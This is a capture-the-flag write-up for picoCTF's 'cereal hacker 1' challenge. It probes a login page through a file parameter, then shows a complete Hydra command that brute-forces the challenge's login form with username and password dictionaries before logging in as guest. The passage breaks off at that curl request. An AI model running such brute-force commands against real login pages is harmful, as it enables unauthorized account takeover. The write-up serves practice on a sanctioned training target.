## Description:
> Login as admin.
## Solution: 
The website redirects to a login page:
```console

                                                                        Password
                                                                Sign in
```
Since the URI for the login page is `index.php?file=login`, the first thing to try is path traversal. We can access an admin page via:
```console
root@kali:/media/sf_CTFs/pico/cereal_hacker_1# curl https://2019shell1.picoctf.com/problem/49879/index.php?file=admin
                                                        You are not admin!
                                                                Go back to login
```
But not much more. SQL injection does not lead anywhere and no cookies to manipulate. Maybe the admin has a weak password?
First, I tried a dictionary attack on the admin username, and when that didn't work I moved to a list of the most common usernames together with the top 10K passwords using `Hydra`:
```console
root@kali:/media/sf_CTFs/pico/cereal_hacker_1# ~/utils/thc-hydra/hydra -L ~/utils/dictionaries/top-usernames-shortlist.txt -P ~/utils/dictionaries/10-million-password-list-top-10000.txt -f -F 2019shell1.picoctf.com -s 49879 http-post-form "/index.php?file=login:user=^USER^&pass=^PASS^:Invalid Login" -v -R

(Notice the `-f -F` flags which tell `Hydra` to stop scanning once it found a single match - the default is to test all combinations).
We can login with `guest:guest`, let's see what we get:
```console
root@kali:/media/sf_CTFs/pico/cereal_hacker_1# curl https://2019shell1.picoctf.com/problem/49879/index.php?file=login --data "user=guest&pass=guest" -v
